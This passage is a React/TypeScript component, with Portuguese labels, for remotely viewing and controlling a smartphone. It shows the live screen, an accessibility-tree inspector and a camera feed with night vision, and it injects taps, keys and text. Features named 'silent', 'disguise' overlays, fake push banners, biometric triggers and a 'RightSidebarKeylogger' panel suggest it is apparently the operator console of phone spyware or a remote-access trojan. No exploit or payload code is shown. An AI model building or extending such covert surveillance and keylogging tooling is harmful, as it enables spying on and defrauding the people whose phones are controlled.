    activeDragRef.current = null;
    setActiveDrag(null);
    finalizePointerGesture(drag);
  };

  // Skeleton Viewport Pointer Handlers
  const handleSkeletonPointerDown = (e: React.PointerEvent<HTMLDivElement>) => {
    if (!touchActive) return;
    try {
      e.currentTarget.setPointerCapture(e.pointerId);
    } catch {}
    const coords = getSkeletonCalibratedCoords(e.clientX, e.clientY, e.currentTarget);
    const drag: ActiveDragGesture = {
      active: true,
      source: "skeleton",
      startX: coords.devX,
      startY: coords.devY,
      currentX: coords.devX,
      currentY: coords.devY,
      pctStartX: coords.pctX,
      pctStartY: coords.pctY,
      pctCurrentX: coords.pctX,
      pctCurrentY: coords.pctY,
      startTime: Date.now()
    };
    activeDragRef.current = drag;
    setActiveDrag(drag);
    triggerSyncedRipple(coords.devX, coords.devY, "skeleton");
  };

  const handleSkeletonPointerMove = (e: React.PointerEvent<HTMLDivElement>) => {
    if (!activeDragRef.current?.active) return;
    const coords = getSkeletonCalibratedCoords(e.clientX, e.clientY, e.currentTarget);
    activeDragRef.current = {
      ...activeDragRef.current,
      currentX: coords.devX,
      currentY: coords.devY,
      pctCurrentX: coords.pctX,
      pctCurrentY: coords.pctY
    };
    setActiveDrag({ ...activeDragRef.current });
  };

  const handleSkeletonPointerUp = (e: React.PointerEvent<HTMLDivElement>) => {
    try {
      e.currentTarget.releasePointerCapture(e.pointerId);
    } catch {}
    if (!activeDragRef.current?.active) return;
    const drag = activeDragRef.current;
    activeDragRef.current = null;
    setActiveDrag(null);
    finalizePointerGesture(drag);
  };

  // Node Click in Accessibility Inspector
  const handleSelectA11yNode = (node: AccessibilityNode, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    setInspectedNode(node);
    const b = parseBounds(node.bounds);
    if (!b) return;

    if (touchActive && node.clickable) {
      api.sendTouch(device.id, b.centerX, b.centerY, 720, 1280).catch(() => {});
      triggerSyncedRipple(b.centerX, b.centerY, "skeleton");
      showToast(`✓ Toque acionado no elemento: "${sanitizeA11yText(node.text || node.name || "Alvo").slice(0, 20)}"`, "success");
      triggerImmediateFrame();
      setTimeout(triggerImmediateFrame, 60);
      setTimeout(triggerImmediateFrame, 180);
      setTimeout(refreshA11y, 220);
    } else {
      showToast(`Elemento inspecionado: ${sanitizeA11yText(node.text || node.name || "Elemento").slice(0, 25)}`, "info");
    }
  };

  const handleSendShellCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!command.trim()) return;
    const cmd = command.trim();
    setCommand("");
    setHistoryNavIndex(-1);

    const newSentItem: SentHistoryItem = {
      id: `sent_${Date.now()}`,
      text: cmd,
      timestamp: new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" }),
      appName: resolvedActiveApp.name
    };

    setSentHistory((prev) => {
      const updated = [newSentItem, ...prev.slice(0, 49)];
      try {
        localStorage.setItem(`dview_sent_history_${device.id}`, JSON.stringify(updated));
      } catch {}
      return updated;
    });

    try {
      await api.sendText(device.id, cmd);
      showToast(`✓ Texto injetado no celular: "${cmd}"`, "success");
      triggerImmediateFrame();
    } catch (err: any) {
      showToast(`Erro ao enviar texto: ${err.message}`, "info");
    }
  };

  const handleMacroAction = async (keyAction: string, label: string) => {
    try {
      let keyVal: string = "home";
      if (keyAction.includes("3") || label.toLowerCase().includes("home")) keyVal = "home";
      else if (keyAction.includes("4") || label.toLowerCase().includes("voltar") || label.toLowerCase().includes("back")) keyVal = "back";
      else if (keyAction.includes("187") || label.toLowerCase().includes("recentes")) keyVal = "recents";
      else if (keyAction.includes("26") || label.toLowerCase().includes("power")) keyVal = "power";
      else if (label.toLowerCase().includes("capturar")) {
        triggerImmediateFrame();
        showToast("Tela atualizada com sucesso", "success");
        return;
      }

      await api.sendKey(device.id, keyVal);
      showToast(`Ação executada: ${label}`, "success");
      triggerImmediateFrame();
      refreshA11y();
    } catch (err: any) {
      showToast(`Erro: ${err.message}`, "info");
    }
  };

  return (
    <div
      ref={containerRef}
      className={`control-view-container tactical-screen-master ${isFullscreen ? "is-fullscreen" : ""}`}
    >
      {/* Toast Alert / Feedback */}
      {toastMsg && (
        <div className={`tactical-toast-badge toast-${toastType}`}>
          <span>{toastMsg}</span>
        </div>
      )}

      {/* 1. BARRA SUPERIOR DE CONTROLES TÁTICOS (MODULARIZADA) */}
      <ScreenViewToolbar
        device={device}
        handleMacroAction={handleMacroAction}
        deviceVolume={deviceVolume}
        isMuted={isMuted}
        handleVolumeStep={handleVolumeStep}
        handleVolumeChange={handleVolumeChange}
        activeApp={activeApp}
        onCloseApp={onCloseApp}
        silentActive={silentActive}
        setSilentActive={setSilentActive}
        srActive={srActive}
        setSrActive={setSrActive}
        hidActive={hidActive}
        setHidActive={setHidActive}
        joyActive={joyActive}
        setJoyActive={setJoyActive}
        tacticalSwitch={tacticalSwitch}
        setTacticalSwitch={setTacticalSwitch}
        touchActive={touchActive}
        setTouchActive={setTouchActive}
        telaActive={telaActive}
        setTelaActive={setTelaActive}
        camActive={camActive}
        setCamActive={setCamActive}
        shellActive={shellActive}
        setShellActive={setShellActive}
        isBiometricActive={isBiometricActive}
        handleBiometricAuth={handleBiometricAuth}
        activeDisguise={activeDisguise}
        setSidebarInitialTab={setSidebarInitialTab}
        setShowRightSidebar={setShowRightSidebar}
        showRightSidebar={showRightSidebar}
        adaptiveMode={adaptiveMode}
        setAdaptiveMode={setAdaptiveMode}
        streamQuality={streamQuality}
        setStreamQuality={setStreamQuality}
        activeQualityRef={activeQualityRef}
        setFps={setFps}
        isAutoFit={isAutoFit}
        setIsAutoFit={setIsAutoFit}
        viewScale={viewScale}
        setViewScale={setViewScale}
        isLocked={isLocked}
        handleToggleLock={handleToggleLock}
        isPinned={isPinned}
        handleTogglePin={handleTogglePin}
        handleCopyInfo={handleCopyInfo}
        setScreenTimestamp={setScreenTimestamp}
        refreshA11y={refreshA11y}
        handleToggleFullscreen={handleToggleFullscreen}
        showToast={showToast}
      />

      {/* 2. CORPO PRINCIPAL: VIEWPORTS CENTRAIS (1, 2 OU 3 TELAS MODULARIZADAS) */}
      <div className="tactical-screen-body-row">
        <div className="tactical-stage-and-footer-column">
          <div
            ref={stageRef}
            className={`tactical-viewports-stage screens-${activeScreensCount} ${isAutoFit ? "is-auto-fit" : ""}`}
            data-screens={activeScreensCount}
          >
            <div
              className="tactical-viewport-scale-wrapper"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                height: "100%",
                width: "100%",
                gap: activeScreensCount > 1 ? "16px" : "0"
              }}
            >
              {/* PAINEL 1: TELA AO VIVO DO SMARTPHONE (LIVE VIEWPORT) */}
              {telaActive && (
                <ScreenViewPhoneFrame
                  viewportDimensions={viewportDimensions}
                  device={device}
                  fps={fps}
                  adaptiveMode={adaptiveMode}
                  setAdaptiveMode={setAdaptiveMode}
                  currentProfile={currentProfile}
                  liveLatency={liveLatency}
                  foregroundApp={resolvedActiveApp}
                  deviceAspectRatio={deviceAspectRatio}
                  screenWrapperRef={screenWrapperRef}
                  canvasRef={canvasRef}
                  handleLivePointerDown={handleLivePointerDown}
                  handleLivePointerMove={handleLivePointerMove}
                  handleLivePointerUp={handleLivePointerUp}
                  touchActive={touchActive}
                  activeDrag={activeDrag}
                  imgRef={imgRef}
                  activeFrameSrc={activeFrameSrc}
                  activeDisguise={activeDisguise}
                  handleClearDisguise={handleClearDisguise}
                  activePushBanner={activePushBanner}
                  setActivePushBanner={setActivePushBanner}
                  syncedRipples={syncedRipples}
                  showTouchHUD={showTouchHUD}
                  activeTouchFeedback={activeTouchFeedback}
                  triggerImmediateFrame={triggerImmediateFrame}
                  refreshA11y={refreshA11y}
                  isStreaming={isStreaming}
                  lastFrameSuccessTimeRef={lastFrameSuccessTimeRef}
                  setScreenTimestamp={setScreenTimestamp}
                  handleMacroAction={handleMacroAction}
                  showToast={showToast}
                />
              )}

              {/* PAINEL 2: SCREEN READER (TELA ESQUELETO 2D WIREFRAME / ACESSIBILIDADE) */}
              {srActive && (
                <ScreenViewSkeletonInspector
                  viewportDimensions={viewportDimensions}
                  deviceAspectRatio={deviceAspectRatio}
                  device={device}
                  resolvedActiveApp={resolvedActiveApp}
                  skeletonViewMode={skeletonViewMode}
                  setSkeletonViewMode={setSkeletonViewMode}
                  skeletonViewportRef={skeletonViewportRef}
                  touchActive={touchActive}
                  activeDrag={activeDrag}
                  handleSkeletonPointerDown={handleSkeletonPointerDown}
                  handleSkeletonPointerMove={handleSkeletonPointerMove}
                  handleSkeletonPointerUp={handleSkeletonPointerUp}
                  syncedRipples={syncedRipples}
                  activeDisguise={activeDisguise}
                  skeletonXRayMode={skeletonXRayMode}
                  setSkeletonXRayMode={setSkeletonXRayMode}
                  activePushBanner={activePushBanner}
                  a11yNodes={a11yNodes}
                  inspectedNode={inspectedNode}
                  setInspectedNode={setInspectedNode}
                  handleSelectA11yNode={handleSelectA11yNode}
                  refreshA11y={refreshA11y}
                  isLoadingA11y={isLoadingA11y}
                  handleMacroAction={handleMacroAction}
                />
              )}

              {/* PAINEL 3: CÂMERA AO VIVO DO APARELHO (FEED ÓPTICO SIMULTÂNEO) */}
              {camActive && (
                <ScreenViewCameraFrame
                  viewportDimensions={viewportDimensions}
                  device={device}
                  activeCamera={activeCamera}
                  setActiveCamera={setActiveCamera}
                  torchOn={torchOn}
                  setTorchOn={setTorchOn}
                  nightVision={nightVision}
                  setNightVision={setNightVision}
                  deviceAspectRatio={deviceAspectRatio}
                  screenTimestamp={screenTimestamp}
                  showCameraGrid={showCameraGrid}
                  cameraResolution={cameraResolution}
                  isCapturingPhoto={isCapturingPhoto}
                  handleCaptureCameraPhoto={handleCaptureCameraPhoto}
                  handleMacroAction={handleMacroAction}
                  showToast={showToast}
                />
              )}

              {/* ESTADO VAZIO: Nenhuma Tela Ativa */}
              {activeScreensCount === 0 && (
                <div className="tactical-no-screens-card">
                  <Smartphone size={36} style={{ color: "#38bdf8" }} />
                  <h3 style={{ margin: "10px 0 6px 0", color: "#f8fafc" }}>Nenhuma Tela Selecionada</h3>
                  <p style={{ color: "#94a3b8", fontSize: "12px", maxWidth: "360px", margin: "0 auto" }}>
                    Ative as telas que deseja visualizar simultaneamente na barra superior:
                  </p>
                  <div style={{ display: "flex", gap: "8px", justifyContent: "center", marginTop: "14px" }}>
                    <button type="button" className="primary compact-btn" onClick={() => setTelaActive(true)}>
                      + Ativar Tela Ao Vivo
                    </button>
                    <button type="button" className="secondary compact-btn" onClick={() => setSrActive(true)}>
                      + Ativar Esqueleto 2D
                    </button>
                    <button type="button" className="secondary compact-btn" onClick={() => setCamActive(true)}>
                      + Ativar Câmera
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Banner Flutuante de Ajuda do Modo Tela Cheia */}
            {showExitHint && (
              <div
                className="tactical-fullscreen-hint-banner"
                onClick={() => setShowExitHint(false)}
                title="Toque para dispensar"
              >
                Pressione Esc ou arraste de cima para baixo da tela para sair da tela cheia
              </div>
            )}
          </div>

          {/* 3. RODAPÉ TÁTICO: Terminal Shell / Digitação Aprimorada (MODULARIZADO) */}
          <ScreenViewFooter
            shellActive={shellActive}
            showHistoryDrawer={showHistoryDrawer}
            setShowHistoryDrawer={setShowHistoryDrawer}
            sentHistory={sentHistory}
            setSentHistory={setSentHistory}
            device={device}
            handleSendPresetText={handleSendPresetText}
            handleSendShellCommand={handleSendShellCommand}
            command={command}
            setCommand={setCommand}
            handleKeyDownCommandInput={handleKeyDownCommandInput}
            showRightSidebar={showRightSidebar}
            currentProfile={currentProfile}
            adaptiveMode={adaptiveMode}
            liveLatency={liveLatency}
            liveSpeed={liveSpeed}
            showToast={showToast}
          />
        </div>

        {/* Botão Flutuante de Aba Lateral Direita */}
        {!showRightSidebar && (
          <button
            type="button"
            className="tactical-floating-right-tab"
            onClick={() => setShowRightSidebar(true)}
            title="Expandir Submenu Direito (Teclas, Telas & Push)"
            style={{
              borderColor: activeDisguise?.active ? "#ff1a2a" : "#22c55e",
              color: activeDisguise?.active ? "#ff4d5a" : "#22c55e"
            }}
          >
            <ChevronLeft size={13} style={{ flexShrink: 0 }} />
            {activeDisguise?.active ? (
              <Smartphone size={13} style={{ color: "#ff1a2a" }} />
            ) : (
              <Keyboard size={13} style={{ color: "#22c55e" }} />
            )}
            <span>{activeDisguise?.active ? "TELAS (ATIVA)" : "TECLAS & TELAS"}</span>
          </button>
        )}

        {/* Drawer Lateral Direito */}
        <RightSidebarKeylogger
          device={device}
          isOpen={showRightSidebar}
          onClose={() => setShowRightSidebar(false)}
          onVolumeChange={handleVolumeChange}
          deviceVolume={deviceVolume}
          isMuted={isMuted}
          onToggleMute={() => handleVolumeStep("mute")}
          onTriggerBiometric={() => handleBiometricAuth()}
          showToast={showToast}
          activeDisguise={activeDisguise}
          onDisguiseChange={setActiveDisguise}
          initialTab={sidebarInitialTab}
          onPushNotificationSent={(notif) => {
            if (pushBannerTimerRef.current) {
              clearTimeout(pushBannerTimerRef.current);
            }
            setActivePushBanner(notif);
            pushBannerTimerRef.current = window.setTimeout(() => {
              setActivePushBanner(null);
            }, 7500);
          }}
        />
      </div>
    </div>
  );
}
